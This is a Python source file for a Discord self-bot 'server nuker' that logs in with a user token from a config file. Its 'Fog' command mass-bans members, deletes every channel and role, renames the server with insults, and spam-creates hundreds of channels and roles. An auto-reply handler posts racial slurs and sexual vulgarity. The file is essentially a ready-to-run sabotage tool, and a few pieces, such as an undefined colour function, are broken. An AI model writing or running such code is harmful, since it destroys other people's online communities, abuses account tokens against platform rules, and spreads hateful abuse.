class ServerNuker():
    __version__ = 1

import discord, subprocess, sys, time, os, colorama, base64, codecs, datetime, io, random, numpy, datetime, smtplib, string, ctypes, pokepy
import urllib.parse, urllib.request, re, json, requests, webbrowser, aiohttp, dns.name, asyncio, functools, logging

from discord.ext import (
    commands,
    tasks
)
from bs4 import BeautifulSoup as bs4
from urllib.parse import urlencode
from pymongo import MongoClient
from selenium import webdriver
from threading import Thread
from subprocess import call
from itertools import cycle
from colorama import Fore
from sys import platform
from PIL import Image
import pyPrivnote as pn
from gtts import gTTS
from randomuser import RandomUser
from pythonping import ping as pyping

ctypes.windll.kernel32.SetConsoleTitleW(f'[Ioxide Server Nuker v{ServerNuker.__version__}] | Loading in...')

with open('config.json') as f:
    config = json.load(f)

token = config.get('token')
password = config.get('pass')
prefix = config.get('prefix')
anti_afk = config.get('anti_afk')

width = os.get_terminal_size().columns  
def startprint():
     if anti_afk == True:
         antiafk = 'Enabled'
     else:
        antiafk = 'Disabled'

     print(f'''{Fore.RESET}
                    {Fore.GREEN} ██▓ ▒█████  ▒██   ██▒ ██▓▓█████▄ ▓█████ 
                    {Fore.GREEN}▓██▒▒██▒  ██▒▒▒ █ █ ▒░▓██▒▒██▀ ██▌▓█   ▀ 
                    {Fore.GREEN}▒██▒▒██░  ██▒░░  █   ░▒██▒░██   █▌▒███   
                    {Fore.GREEN}░██░▒██   ██░ ░ █ █ ▒ ░██░░▓█▄   ▌▒▓█  ▄ 
                    {Fore.GREEN}░██░░ ████▓▒░▒██▒ ▒██▒░██░░▒████▓ ░▒████▒
                    {Fore.GREEN}░▓  ░ ▒░▒░▒░ ▒▒ ░ ░▓ ░░▓   ▒▒▓  ▒ ░░ ▒░ ░
                    {Fore.GREEN} ▒ ░  ░ ▒ ▒░ ░░   ░▒ ░ ▒ ░ ░ ▒  ▒  ░ ░  ░
                    {Fore.GREEN} ▒ ░░ ░ ░ ▒   ░    ░   ▒ ░ ░ ░  ░    ░   
                    {Fore.GREEN} ░      ░ ░   ░    ░   ░     ░       ░  ░
                    {Fore.GREEN}                           ░             
                                    
                        {Fore.GREEN}Logged In As ==> {Fore.WHITE}{Ioxide.user.name}#{Ioxide.user.discriminator}{Fore.WHITE}
                        {Fore.GREEN}ID ==> {Fore.WHITE}{Ioxide.user.id}
                        {Fore.GREEN}Anti-AFK ==> {Fore.WHITE}{antiafk}
                        {Fore.GREEN}Version ==> {Fore.WHITE} v{ServerNuker.__version__}
                    '''+Fore.RESET)


def Clear():
    os.system('cls')
Clear()

def Init():
    if config.get('token') == "token-here":
        Clear()
        print(f"{Fore.WHITE}[ERROR] {Fore.YELLOW}You didnt put your token in the config.json file"+Fore.RESET)
    else:
        token = config.get('token')
        try:
            Ioxide.run(token, bot=False, reconnect=True)
            os.system(f'title [ Ioxide Nuker ] - Version {ServerNuker.__version__}')
        except discord.errors.LoginFailure:
            print(f"{Fore.WHITE}[ERROR] {Fore.YELLOW}Sure this is a token? lol"+Fore.RESET)
            os.system('pause >NUL')

class Login(discord.Client):
    async def on_connect(self):
        guilds = len(self.guilds)
        users = len(self.users)
        print("")
        print(f"Connected to: [{self.user.name}]")
        print(f"Token: {self.http.token}")
        print(f"Guilds: {guilds}")
        print(f"Users: {users}")
        print("-------------------------------")
        await self.logout()

colorama.init()
Ioxide = discord.Client()
Ioxide = commands.Bot(
    description='Ioxide Nuker',
    command_prefix=prefix,
    self_bot=True
)
Ioxide.remove_command('help') 

@Ioxide.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        print(f"{Fore.WHITE}Error: {Fore.YELLOW}You're missing permission to execute this command"+Fore.RESET)
    elif isinstance(error, commands.MissingRequiredArgument):
        print(f"{Fore.WHITE}Error: {Fore.YELLOW}Missing arguments: {error}"+Fore.RESET)
    elif isinstance(error, numpy.AxisError):
        print(f"{Fore.WHITE}Error: {Fore.YELLOW}Not a valid image"+Fore.RESET)
    elif isinstance(error, discord.errors.Forbidden):
        print(f"{Fore.WHITE}Error: {Fore.YELLOW}Discord error: {error}"+Fore.RESET)
    elif "Cannot send an empty message" in error_str:
        print(f"{Fore.WHITE}Error: {Fore.YELLOW}Couldnt send a empty message"+Fore.RESET)               
    else:
        print(f"{Fore.WHITE}Error: {Fore.YELLOW}{error_str}"+Fore.RESET)

@Ioxide.event
async def on_message_edit(before, after):
    await Ioxide.process_commands(after)

@Ioxide.event
async def on_message(message):
    responses = ["what nigga", "shut up and focus son", "nigga im right here lmfao", "sybau and focus on gettin blazed","I got 2 dicks in my ass and u still cant pack me. fuck up nigga"]
    nums = [1, 1.3, 1.5, 2, 2.3, 2.6, 3, 3.8, 5, 4, 6, 7]
    ptime = random.choice(nums)
    ## Begin Long Annoying Anti-AFK Checking..
    if 'afk c' in message.content:
        if anti_afk == True:
                try:
                    randomResponses = random.choice(responses)
                    msg = randomResponses
                    time.sleep(ptime)
                    await message.channel.send(msg)
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.RED}was unable to send message at{Fore.WHITE} {time}"+Fore.RESET)
    elif 'AFK C' in message.content:
        if anti_afk == True:
            try:
                randomResponses = random.choice(responses)
                time.sleep(ptime)
                msg = randomResponses
                await message.channel.send(msg)
            except discord.errors.Forbidden:
                print(""
                f"\n{Fore.RED}was unable to send message at{Fore.WHITE} {time}"+Fore.RESET)

    elif 'AFK c' in message.content:
        if anti_afk == True:
            try:
                randomResponses = random.choice(responses)
                time.sleep(ptime)
                msg = randomResponses
                await message.channel.send(msg)
            except discord.errors.Forbidden:
                print(""
                f"\n{Fore.RED}was unable to send message at{Fore.WHITE} {time}"+Fore.RESET)
        return

    await Ioxide.process_commands(message)

@Ioxide.event
async def on_connect():
    Clear()

    if anti_afk == True:
        antiafk = "Enabled"
    else:
        antiafk = "Disabled"

    startprint()
    ctypes.windll.kernel32.SetConsoleTitleW(f'[ Misty Nuker v{ServerNuker.__version__} ] | Logged in as {Ioxide.user.name}')

@Ioxide.command(aliases=['serverdestroy','ruinserver','doafredo'])
async def Fog(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name="Misty Got Youu",
            description="get fucked by Misty LOL",
            reason="cuz MistyW nigga",
            icon=None,
            banner=None
        )
    except:
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name="Mist Slapped u XD")
    for _i in range(250):
        await ctx.guild.create_role(name="MistW", color=RandomColor())

if __name__ == '__main__':
    Init()


